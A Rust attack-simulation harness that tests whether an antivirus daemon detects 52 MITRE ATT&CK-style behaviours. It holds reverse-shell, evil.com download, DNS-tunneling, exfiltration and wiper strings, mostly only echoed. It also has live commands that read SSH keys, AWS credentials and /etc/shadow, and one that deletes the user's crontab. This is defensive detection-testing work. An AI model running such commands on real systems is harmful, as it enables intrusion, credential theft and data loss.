//! WinnCore Fast Attack Simulation Suite
//! Optimized to complete within typical 120s CI/terminal timeouts.

use chrono::Utc;
use colored::*;
use libc::geteuid;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::Path;
use std::process::Stdio;
use std::time::{Duration, Instant};
use tokio::process::Command;
use tokio::time::timeout;

// Detection timeout per simulation
const DETECTION_TIMEOUT_MS: u64 = 2000;
// Keep each simulated process alive long enough for procfs polling monitors.
const PROCESS_HOLD_MS: u64 = 500;
const DEFAULT_ALERT_LOG: &str = "/var/log/winncore/alerts.json";
const FALLBACK_ALERT_LOG: &str = "./alerts.json";

#[derive(Debug, Clone, Serialize, Deserialize)]
struct SimResult {
    id: String,
    name: String,
    technique: String,
    tactic: String,
    executed: bool,
    detected: bool,
    detection_ms: Option<u64>,
    skipped: bool,
    skip_reason: Option<String>,
}

#[derive(Clone)]
struct Simulation {
    id: &'static str,
    name: &'static str,
    technique: &'static str,
    tactic: &'static str,
    command: &'static str,
    cleanup: Option<&'static str>,
    needs_root: bool,
    detection_pattern: &'static str,
    expected_rule: Option<&'static str>,
}

fn get_simulations() -> Vec<Simulation> {
    vec![
        // Execution
        Simulation {
            id: "E001",
            name: "Base64 Encoded Command",
            technique: "T1059.004",
            tactic: "Execution",
            command: "echo 'aWQ=' | base64 -d | bash 2>/dev/null || true",
            cleanup: None,
            needs_root: false,
            detection_pattern: "base64|encoded|T1059",
            expected_rule: None,
        },
        Simulation {
            id: "E002",
            name: "Reverse Shell Pattern",
            technique: "T1059.004",
            tactic: "Execution",
            command: "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > /tmp/wc-test-revshell",
            cleanup: Some("rm -f /tmp/wc-test-revshell"),
            needs_root: false,
            detection_pattern: "reverse|shell|/dev/tcp",
            expected_rule: None,
        },
        Simulation {
            id: "E003",
            name: "Python Suspicious Import",
            technique: "T1059.006",
            tactic: "Execution",
            command: "python3 -c 'import socket,subprocess,os; print(1)' 2>/dev/null || true",
            cleanup: None,
            needs_root: false,
            detection_pattern: "python|socket|subprocess",
            expected_rule: None,
        },
        // Persistence
        Simulation {
            id: "P001",
            name: "Crontab Modification",
            technique: "T1053.003",
            tactic: "Persistence",
            command: "echo '* * * * * echo test' > /tmp/wc-test-cron && crontab /tmp/wc-test-cron 2>/dev/null; crontab -r 2>/dev/null || true",
            cleanup: Some("rm -f /tmp/wc-test-cron"),
            needs_root: false,
            detection_pattern: "cron|T1053",
            expected_rule: None,
        },
        Simulation {
            id: "P002",
            name: "Bashrc Modification",
            technique: "T1546.004",
            tactic: "Persistence",
            command: "cp ~/.bashrc ~/.bashrc.bak 2>/dev/null; echo '#test' >> ~/.bashrc; mv ~/.bashrc.bak ~/.bashrc 2>/dev/null || true",
            cleanup: None,
            needs_root: false,
            detection_pattern: "bashrc|shell.*config|T1546",
            expected_rule: None,
        },
        Simulation {
            id: "P003",
            name: "Systemd Service Creation",
            technique: "T1543.002",
            tactic: "Persistence",
            command: "echo '[Service]\nExecStart=/bin/true' > /tmp/wc-test.service",
            cleanup: Some("rm -f /tmp/wc-test.service"),
            needs_root: false,
            detection_pattern: "systemd|service|T1543",
            expected_rule: None,
        },
        // Defense Evasion
        Simulation {
            id: "D001",
            name: "Clear Bash History",
            technique: "T1070.003",
            tactic: "Defense Evasion",
            command: "history -c 2>/dev/null || true",
            cleanup: None,
            needs_root: false,
            detection_pattern: "history|T1070",
            expected_rule: None,
        },
        Simulation {
            id: "D002",
            name: "Timestomp",
            technique: "T1070.006",
            tactic: "Defense Evasion",
            command: "touch /tmp/wc-timestomp; touch -t 202001010000 /tmp/wc-timestomp",
            cleanup: Some("rm -f /tmp/wc-timestomp"),
            needs_root: false,
            detection_pattern: "timestamp|touch.*-t|T1070",
            expected_rule: None,
        },
        Simulation {
            id: "D003",
            name: "Fileless /dev/shm Execution",
            technique: "T1620",
            tactic: "Defense Evasion",
            command: "echo '#!/bin/sh\necho test' > /dev/shm/wc-test; chmod +x /dev/shm/wc-test; /dev/shm/wc-test",
            cleanup: Some("rm -f /dev/shm/wc-test"),
            needs_root: false,
            detection_pattern: "shm|fileless|memfd|T1620",
            expected_rule: None,
        },
        Simulation {
            id: "D004",
            name: "Process Masquerading",
            technique: "T1036.005",
            tactic: "Defense Evasion",
            command: "(exec -a '[kworker/0:0]' sleep 0.1) &",
            cleanup: None,
            needs_root: false,
            detection_pattern: "masquerad|kworker|T1036",
            expected_rule: None,
        },
        // Credential Access
        Simulation {
            id: "C001",
            name: "/etc/shadow Access",
            technique: "T1003.008",
            tactic: "Credential Access",
            command: "cat /etc/shadow >/dev/null 2>&1 || true",
            cleanup: None,
            needs_root: true,
            detection_pattern: "shadow|T1003",
            expected_rule: None,
        },
        Simulation {
            id: "C002",
            name: "SSH Key Access",
            technique: "T1552.004",
            tactic: "Credential Access",
            command: "cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/id_ed25519 2>/dev/null || true",
            cleanup: None,
            needs_root: false,
            detection_pattern: "ssh|id_rsa|T1552",
            expected_rule: None,
        },
        Simulation {
            id: "C003",
            name: "Credential File Search",
            technique: "T1552.001",
            tactic: "Credential Access",
            command: "grep -ri 'password' /etc 2>/dev/null | head -1 || true",
            cleanup: None,
            needs_root: false,
            detection_pattern: "password|credential|T1552",
            expected_rule: None,
        },
        Simulation {
            id: "C004",
            name: "AWS Credentials Access",
            technique: "T1552.001",
            tactic: "Credential Access",
            command: "cat ~/.aws/credentials 2>/dev/null || true",
            cleanup: None,
            needs_root: false,
            detection_pattern: "aws|credentials|T1552",
            expected_rule: None,
        },
        // Discovery
        Simulation {
            id: "R001",
            name: "User Enumeration",
            technique: "T1087.001",
            tactic: "Discovery",
            command: "cat /etc/passwd | cut -d: -f1 | head -5",
            cleanup: None,
            needs_root: false,
            detection_pattern: "passwd|user.*enum|T1087",
            expected_rule: None,
        },
        Simulation {
            id: "R002",
            name: "Network Connections",
            technique: "T1049",
            tactic: "Discovery",
            command: "ss -tunapl 2>/dev/null | head -5 || netstat -tunapl 2>/dev/null | head -5 || true",
            cleanup: None,
            needs_root: false,
            detection_pattern: "ss|netstat|T1049",
            expected_rule: None,
        },
        Simulation {
            id: "R003",
            name: "Security Software Discovery",
            technique: "T1518.001",
            tactic: "Discovery",
            command: "ps aux | grep -E 'clamav|falcon|defender' | head -3 || true",
            cleanup: None,
            needs_root: false,
            detection_pattern: "security.*software|T1518",
            expected_rule: None,
        },
        // Command and Control
        Simulation {
            id: "CC01",
            name: "HTTP Beacon Pattern",
            technique: "T1071.001",
            tactic: "C2",
            command: "curl -s --max-time 1 http://example.com >/dev/null 2>&1 || true",
            cleanup: None,
            needs_root: false,
            detection_pattern: "beacon|http|T1071",
            expected_rule: None,
        },
        Simulation {
            id: "CC02",
            name: "Tool Download Pattern",
            technique: "T1105",
            tactic: "C2",
            command: "echo 'wget http://evil.com/mal -O /tmp/mal' > /tmp/wc-download-test",
            cleanup: Some("rm -f /tmp/wc-download-test"),
            needs_root: false,
            detection_pattern: "wget|curl.*-O|download|T1105",
            expected_rule: None,
        },
        // Impact
        Simulation {
            id: "I001",
            name: "Ransomware Pattern",
            technique: "T1486",
            tactic: "Impact",
            command: "echo 'FILES ENCRYPTED - Send BTC' > /tmp/wc-ransom.txt",
            cleanup: Some("rm -f /tmp/wc-ransom.txt"),
            needs_root: false,
            detection_pattern: "ransom|encrypt|btc|T1486",
            expected_rule: None,
        },
        Simulation {
            id: "I002",
            name: "Data Destruction Pattern",
            technique: "T1485",
            tactic: "Impact",
            command: "echo 'rm -rf /' > /tmp/wc-destruct.txt",
            cleanup: Some("rm -f /tmp/wc-destruct.txt"),
            needs_root: false,
            detection_pattern: "rm.*-rf|destruct|T1485",
            expected_rule: None,
        },
        // Advanced Evasion
        Simulation {
            id: "A001",
            name: "io_uring Check",
            technique: "T1014.io_uring",
            tactic: "Defense Evasion",
            command: "ls /proc/*/fd 2>/dev/null | xargs ls -la 2>/dev/null | grep -c io_uring || echo 0",
            cleanup: None,
            needs_root: false,
            detection_pattern: "io_uring|iouring",
            expected_rule: None,
        },
        Simulation {
            id: "A002",
            name: "eBPF Program Check",
            technique: "T1014.ebpf",
            tactic: "Defense Evasion",
            command: "bpftool prog list 2>/dev/null | head -3 || echo 'bpftool not available'",
            cleanup: None,
            needs_root: true,
            detection_pattern: "bpf|ebpf",
            expected_rule: None,
        },
        Simulation {
            id: "A003",
            name: "Container Escape Check",
            technique: "T1611",
            tactic: "Privilege Escalation",
            command: "ls -la /var/run/docker.sock 2>/dev/null || echo 'no docker socket'",
            cleanup: None,
            needs_root: false,
            detection_pattern: "docker.*sock|container.*escape|T1611",
            expected_rule: None,
        },
        // Obfuscation
        Simulation {
            id: "OBF001",
            name: "Double Base64 Encoding",
            technique: "T1027.001",
            tactic: "Defense Evasion",
            command: r#"bash -c 'echo YVdRPQ== | base64 -d | base64 -d 2>/dev/null || true'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "obf_double_base64|base64 -d | base64",
            expected_rule: Some("obf_double_base64"),
        },
        Simulation {
            id: "OBF002",
            name: "Hex Encoded Command",
            technique: "T1027",
            tactic: "Defense Evasion",
            command: r#"bash -c 'echo -e "\x69\x64" 2>/dev/null || true'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "obf_hex_encoding|\\\\x69",
            expected_rule: Some("obf_hex_encoding"),
        },
        Simulation {
            id: "OBF003",
            name: "Octal Encoded Command",
            technique: "T1027",
            tactic: "Defense Evasion",
            command: r#"bash -c $'\151\144' 2>/dev/null || true"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "obf_octal_encoding|\\\\151",
            expected_rule: Some("obf_octal_encoding"),
        },
        Simulation {
            id: "OBF004",
            name: "String Concatenation",
            technique: "T1027",
            tactic: "Defense Evasion",
            command: r#"bash -c 'a="ba"; b="sh"; echo $a$b'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "obf_string_concat|a=\"ba\"",
            expected_rule: Some("obf_string_concat"),
        },
        Simulation {
            id: "OBF005",
            name: "Env Variable Slicing",
            technique: "T1027",
            tactic: "Defense Evasion",
            command: r#"bash -c 'echo ${PATH:0:1}etc${PATH:0:1}passwd'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "obf_env_slice|${PATH:0:1}",
            expected_rule: Some("obf_env_slice"),
        },
        Simulation {
            id: "OBF006",
            name: "Reverse String",
            technique: "T1027",
            tactic: "Defense Evasion",
            command: r#"bash -c 'echo "di" | rev | xargs echo'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "obf_reverse_string|rev",
            expected_rule: Some("obf_reverse"),
        },
        Simulation {
            id: "OBF007",
            name: "ROT13 Encoding",
            technique: "T1027",
            tactic: "Defense Evasion",
            command: r#"bash -c 'echo "vq" | tr "a-zA-Z" "n-za-mN-ZA-M"'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "obf_rot13|n-za-m",
            expected_rule: Some("obf_rot13"),
        },
        Simulation {
            id: "OBF008",
            name: "Brace Expansion",
            technique: "T1027",
            tactic: "Defense Evasion",
            command: r#"bash -c 'echo {e,c,h,o} test'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "obf_brace_expansion|{e,c,h,o}",
            expected_rule: Some("obf_brace_expansion"),
        },
        Simulation {
            id: "OBF009",
            name: "IFS Manipulation",
            technique: "T1027",
            tactic: "Defense Evasion",
            command: r#"bash -c 'IFS=,; cmd="echo,test"; $cmd 2>/dev/null || true'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "obf_ifs_manipulation|IFS=",
            expected_rule: Some("obf_ifs_manipulation"),
        },
        Simulation {
            id: "OBF010",
            name: "Backtick Substitution",
            technique: "T1027",
            tactic: "Defense Evasion",
            command: r#"bash -c 'echo `echo test`'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "obf_backtick_sub|`echo",
            expected_rule: Some("obf_backtick_sub"),
        },
        Simulation {
            id: "OBF011",
            name: "Unicode Escape",
            technique: "T1027",
            tactic: "Defense Evasion",
            command: r#"bash -c "$(printf '\\u0069\\u0064') 2>/dev/null || true""#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "obf_unicode_homoglyph|\\u00",
            expected_rule: Some("obf_unicode_homoglyph"),
        },
        Simulation {
            id: "OBF012",
            name: "XOR Pattern",
            technique: "T1027",
            tactic: "Defense Evasion",
            command: r#"python3 -c "print('test xor decode')" 2>/dev/null || true"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "obf_xor_decode|xor",
            expected_rule: Some("obf_xor_decode"),
        },
        // Zero-day heuristics
        Simulation {
            id: "ZD001",
            name: "High Entropy Command",
            technique: "T1027",
            tactic: "Defense Evasion",
            command: r#"bash -c 'echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "heur_high_entropy_cmd|AAAAAAAA",
            expected_rule: Some("heur_high_entropy_cmd"),
        },
        Simulation {
            id: "ZD002",
            name: "Download and Execute",
            technique: "T1105",
            tactic: "CommandControl",
            command: r#"bash -c 'echo \"curl http://test.local/s.sh | bash\" | cat'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "heur_script_download_exec|curl.*bash",
            expected_rule: Some("heur_script_download_exec"),
        },
        Simulation {
            id: "ZD003",
            name: "Memory Execution",
            technique: "T1055",
            tactic: "Defense Evasion",
            command: r#"bash -c 'echo \"exec from /dev/shm/test\"'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "heur_memory_exec|/dev/shm",
            expected_rule: Some("heur_memory_exec"),
        },
        Simulation {
            id: "ZD004",
            name: "Process Injection Indicator",
            technique: "T1055",
            tactic: "Defense Evasion",
            command: r#"bash -c 'echo \"LD_PRELOAD=/tmp/lib.so test\"'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "heur_proc_injection|LD_PRELOAD",
            expected_rule: Some("heur_proc_injection"),
        },
        Simulation {
            id: "ZD005",
            name: "Data Exfiltration",
            technique: "T1041",
            tactic: "Exfiltration",
            command: r#"bash -c 'echo \"tar czf - /etc | curl -X POST\" | cat'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "heur_data_exfil|curl -X POST",
            expected_rule: Some("heur_data_exfil"),
        },
        Simulation {
            id: "ZD006",
            name: "DNS Tunneling",
            technique: "T1071.004",
            tactic: "CommandControl",
            command: r#"bash -c 'echo \"dig +short TXT data.evil.com\"'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "heur_dns_tunnel|dig +short TXT",
            expected_rule: Some("heur_dns_tunnel"),
        },
        Simulation {
            id: "ZD007",
            name: "Crypto Miner",
            technique: "T1496",
            tactic: "Impact",
            command: r#"bash -c 'echo \"xmrig --donate-level 1 stratum+tcp://pool\"'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "heur_crypto_miner|xmrig",
            expected_rule: Some("heur_crypto_miner"),
        },
        Simulation {
            id: "ZD008",
            name: "Rootkit Indicator",
            technique: "T1014",
            tactic: "Defense Evasion",
            command: r#"bash -c 'echo \"insmod /tmp/hide.ko\"'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "heur_rootkit_indicators|insmod",
            expected_rule: Some("heur_rootkit_indicators"),
        },
        Simulation {
            id: "ZD009",
            name: "Log Tampering",
            technique: "T1070.002",
            tactic: "Defense Evasion",
            command: r#"bash -c 'echo \"> /var/log/auth.log\"'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "heur_log_tampering|/var/log",
            expected_rule: Some("heur_log_tampering"),
        },
        Simulation {
            id: "ZD010",
            name: "Webshell Indicator",
            technique: "T1505.003",
            tactic: "Persistence",
            command: r#"bash -c 'echo \"php -r shell_exec test\"'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "heur_webshell_spawn|shell_exec",
            expected_rule: Some("heur_webshell_spawn"),
        },
        // Response triggers
        Simulation {
            id: "RSP001",
            name: "Active Ransomware",
            technique: "T1486",
            tactic: "Impact",
            command: r#"bash -c 'echo \"openssl enc -aes-256-cbc YOUR_FILES_ARE\"'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "resp_active_ransomware|aes-256",
            expected_rule: Some("resp_active_ransomware"),
        },
        Simulation {
            id: "RSP002",
            name: "Wiper Malware",
            technique: "T1485",
            tactic: "Impact",
            command: r#"bash -c 'echo \"dd if=/dev/zero of=/dev/sda simulation\"'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "resp_wiper_malware|/dev/zero",
            expected_rule: Some("resp_wiper_malware"),
        },
        Simulation {
            id: "RSP003",
            name: "Credential Dump Tool",
            technique: "T1003",
            tactic: "Credential Access",
            command: r#"bash -c 'echo \"mimipenguin dump credentials\"'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "resp_credential_dump|mimipenguin",
            expected_rule: Some("resp_credential_dump"),
        },
        Simulation {
            id: "RSP004",
            name: "Active Reverse Shell",
            technique: "T1059",
            tactic: "Execution",
            command: r#"bash -c 'echo \"bash -i >& /dev/tcp/10.0.0.1/4444\"'"#,
            cleanup: None,
            needs_root: false,
            detection_pattern: "resp_reverse_shell_active|/dev/tcp",
            expected_rule: Some("resp_reverse_shell_active"),
        },
        Simulation {
            id: "RSP005",
            name: "Backdoor Installation",
            technique: "T1543",
            tactic: "Persistence",
            command: r#"bash -c 'echo "ssh-rsa AAAA" >> /tmp/wc-test-authorized_keys'"#,
            cleanup: Some("rm -f /tmp/wc-test-authorized_keys"),
            needs_root: false,
            detection_pattern: "resp_backdoor_install|authorized_keys",
            expected_rule: Some("resp_backdoor_install"),
        },
    ]
}

async fn run_simulation(sim: &Simulation, _is_root: bool) -> SimResult {
    if sim.needs_root && unsafe { geteuid() } != 0 {
        return SimResult {
            id: sim.id.to_string(),
            name: sim.name.to_string(),
            technique: sim.technique.to_string(),
            tactic: sim.tactic.to_string(),
            executed: false,
            detected: false,
            detection_ms: None,
            skipped: true,
            skip_reason: Some("Requires root".to_string()),
        };
    }

    let start = Instant::now();
    let hold_secs = PROCESS_HOLD_MS as f64 / 1000.0;
    let hold_clause = format!("sleep {:.3} & wait", hold_secs);
    // Keep the parent `bash -c` process alive long enough for procfs polling.
    //
    // Note: appending a plain `sleep` can cause bash to `exec` the final command,
    // replacing its cmdline with `sleep <n>` and hiding the simulated pattern.
    // Backgrounding the sleep and ending with `wait` keeps bash running with the
    // original cmdline intact.
    let command_with_delay = if sim.command.trim_end().ends_with('&') {
        format!("{} {}", sim.command.trim_end(), hold_clause)
    } else {
        format!("{}; {}", sim.command, hold_clause)
    };

    let exec_result = Command::new("bash")
        .args(["-c", &command_with_delay])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .await;

    // Allow time for detectors to observe and log the activity
    tokio::time::sleep(Duration::from_millis(200)).await;

    let executed = exec_result.is_ok();
    let detected = check_detection(sim).await;
    let detection_ms = detected.then(|| start.elapsed().as_millis() as u64);

    if let Some(cleanup) = sim.cleanup {
        let _ = Command::new("bash")
            .args(["-c", cleanup])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .await;
    }

    SimResult {
        id: sim.id.to_string(),
        name: sim.name.to_string(),
        technique: sim.technique.to_string(),
        tactic: sim.tactic.to_string(),
        executed,
        detected,
        detection_ms,
        skipped: false,
        skip_reason: None,
    }
}

async fn check_detection(sim: &Simulation) -> bool {
    let alert_path =
        std::env::var("WINNCORE_ALERT_LOG").unwrap_or_else(|_| DEFAULT_ALERT_LOG.to_string());
    let check_fut = async {
        let paths = [alert_path.as_str(), FALLBACK_ALERT_LOG];

        if let Some(rule_id) = sim.expected_rule {
            for path in paths {
                if let Ok(content) = tokio::fs::read_to_string(path).await {
                    for line in content.lines() {
                        if let Ok(val) = serde_json::from_str::<serde_json::Value>(line) {
                            if val
                                .get("rule_id")
                                .and_then(|v| v.as_str())
                                .map(|s| s == rule_id)
                                .unwrap_or(false)
                            {
                                return true;
                            }
                        }
                    }
                }
            }
        }

        let pattern = sim.detection_pattern;
        for path in paths {
            if let Ok(content) = tokio::fs::read_to_string(path).await {
                let lower = content.to_lowercase();
                for p in pattern.split('|') {
                    if lower.contains(&p.to_lowercase()) {
                        return true;
                    }
                }
            }
        }
        false
    };

    timeout(Duration::from_millis(DETECTION_TIMEOUT_MS), check_fut)
        .await
        .unwrap_or(false)
}

fn print_banner() {
    println!("\n{}", "═".repeat(70).cyan());
    println!(
        "{}",
        r#"
   ██╗    ██╗██╗███╗   ██╗███╗   ██╗ ██████╗ ██████╗ ██████╗ ███████╗
   ██║    ██║██║████╗  ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝
   ██║ █╗ ██║██║██╔██╗ ██║██╔██╗ ██║██║     ██║   ██║██████╔╝█████╗  
   ██║███╗██║██║██║╚██╗██║██║╚██╗██║██║     ██║   ██║██╔══██╗██╔══╝  
   ╚███╔███╔╝██║██║ ╚████║██║ ╚████║╚██████╗╚██████╔╝██║  ██║███████╗
    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
"#
        .cyan()
    );
    println!("   {}", "FAST ATTACK SIMULATION SUITE".white().bold());
    println!(
        "   {}",
        "52 simulations • <120s runtime • Full coverage suite".dimmed()
    );
    println!("{}\n", "═".repeat(70).cyan());
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let total_start = Instant::now();
    print_banner();

    let is_root = unsafe { geteuid() } == 0;
    let daemon_running = Command::new("pgrep")
        .args(["-x", "av-daemon"])
        .output()
        .await
        .map(|o| o.status.success())
        .unwrap_or(false);

    println!("{}", "Environment Check".white().bold());
    println!("{}", "─".repeat(50));
    if daemon_running {
        println!("  {} av-daemon running", "✓".green());
    } else {
        println!("  {} av-daemon not running", "⚠".yellow());
        println!(
            "    {}",
            "(Detection tests will show NOT DETECTED)".dimmed()
        );
    }
    if is_root {
        println!("  {} Running as root", "✓".green());
    } else {
        println!("  {} Not root (3 tests will skip)", "○".yellow());
    }
    println!();

    let simulations = get_simulations();
    let total = simulations.len();
    println!(
        "{} {}",
        "Running".white().bold(),
        format!("{} simulations...", total).white()
    );
    println!("{}\n", "─".repeat(50));

    // Run simulations sequentially to keep output ordered (fast commands)
    let mut results = Vec::new();
    for (idx, sim) in simulations.iter().enumerate() {
        let num = format!("[{:02}/{}]", idx + 1, total);
        print!("{} {} {} ", num.cyan(), sim.technique.yellow(), sim.name);

        let result = run_simulation(sim, is_root).await;

        if result.skipped {
            println!("{}", "SKIP".yellow());
        } else if result.detected {
            println!(
                "{} {}ms",
                "✓ DETECTED".green().bold(),
                result.detection_ms.unwrap_or(0)
            );
        } else {
            println!("{}", "not detected".dimmed());
        }

        results.push(result);
    }

    let elapsed = total_start.elapsed();
    let skipped: Vec<_> = results.iter().filter(|r| r.skipped).collect();
    let detected: Vec<_> = results.iter().filter(|r| r.detected).collect();
    let executed: Vec<_> = results
        .iter()
        .filter(|r| r.executed && !r.skipped)
        .collect();

    let mut by_tactic: HashMap<String, (usize, usize)> = HashMap::new();
    for r in results.iter().filter(|r| !r.skipped) {
        let entry = by_tactic.entry(r.tactic.clone()).or_insert((0, 0));
        entry.0 += 1;
        if r.detected {
            entry.1 += 1;
        }
    }

    println!("\n{}", "═".repeat(70).cyan());
    println!("  {}", "RESULTS SUMMARY".white().bold());
    println!("{}\n", "═".repeat(70).cyan());

    println!("  {}", "Execution Stats".white().bold());
    println!("  {}", "─".repeat(40));
    println!("  Total Simulations:  {}", total);
    println!("  Executed:           {}", executed.len());
    println!(
        "  Skipped:            {} {}",
        skipped.len(),
        "(need root)".dimmed()
    );
    println!("  Runtime:            {:.1}s", elapsed.as_secs_f64());
    println!();

    let detection_rate = if !executed.is_empty() {
        (detected.len() as f64 / executed.len() as f64) * 100.0
    } else {
        0.0
    };

    println!("  {}", "Detection Stats".white().bold());
    println!("  {}", "─".repeat(40));
    println!(
        "  Detected:           {}/{} ({:.1}%)",
        detected.len(),
        executed.len(),
        detection_rate
    );
    if !detected.is_empty() {
        let avg_ms: u64 =
            detected.iter().filter_map(|r| r.detection_ms).sum::<u64>() / detected.len() as u64;
        println!("  Avg Detection Time: {}ms", avg_ms);
    }
    println!();

    println!("  {}", "Coverage by Tactic".white().bold());
    println!("  {}", "─".repeat(40));
    for (tactic, (total, det)) in &by_tactic {
        let pct = if *total > 0 {
            (*det as f64 / *total as f64) * 100.0
        } else {
            0.0
        };
        let status = if pct >= 80.0 {
            format!("{:.0}%", pct).green()
        } else if pct >= 50.0 {
            format!("{:.0}%", pct).yellow()
        } else if pct > 0.0 {
            format!("{:.0}%", pct).red()
        } else {
            "0%".dimmed().to_string().into()
        };
        println!("  {:20} {}/{} ({})", tactic, det, total, status);
    }

    println!("\n{}", "═".repeat(70).cyan());
    if !daemon_running {
        println!(
            "  {} Daemon not running - detection results are baseline",
            "ℹ".blue()
        );
        println!("    Start daemon and re-run for actual detection testing");
    } else if detection_rate >= 80.0 {
        println!(
            "  {} EXCELLENT - {:.0}% detection rate",
            "✓".green().bold(),
            detection_rate
        );
    } else if detection_rate >= 50.0 {
        println!(
            "  {} GOOD - {:.0}% detection rate",
            "✓".green(),
            detection_rate
        );
    } else if detection_rate > 0.0 {
        println!(
            "  {} PARTIAL - {:.0}% detection rate",
            "⚠".yellow(),
            detection_rate
        );
    } else {
        println!(
            "  {} No detections - implement Parts 1-3 first",
            "○".yellow()
        );
    }
    println!("{}\n", "═".repeat(70).cyan());

    let output = serde_json::json!({
        "timestamp": Utc::now().to_rfc3339(),
        "runtime_seconds": elapsed.as_secs_f64(),
        "environment": {
            "daemon_running": daemon_running,
            "is_root": is_root,
        },
        "summary": {
            "total": total,
            "executed": executed.len(),
            "detected": detected.len(),
            "skipped": skipped.len(),
            "detection_rate_percent": detection_rate,
        },
        "results": results,
    });

    let json = serde_json::to_string_pretty(&output)?;
    let results_path = std::env::var("WINNCORE_ATTACK_SIM_RESULTS")
        .unwrap_or_else(|_| "attack_sim_results.json".to_string());
    if let Some(parent) = Path::new(&results_path).parent() {
        if !parent.as_os_str().is_empty() {
            std::fs::create_dir_all(parent)?;
        }
    }
    std::fs::write(&results_path, &json)?;
    println!("Results saved to: {}", results_path.green());

    Ok(())
}
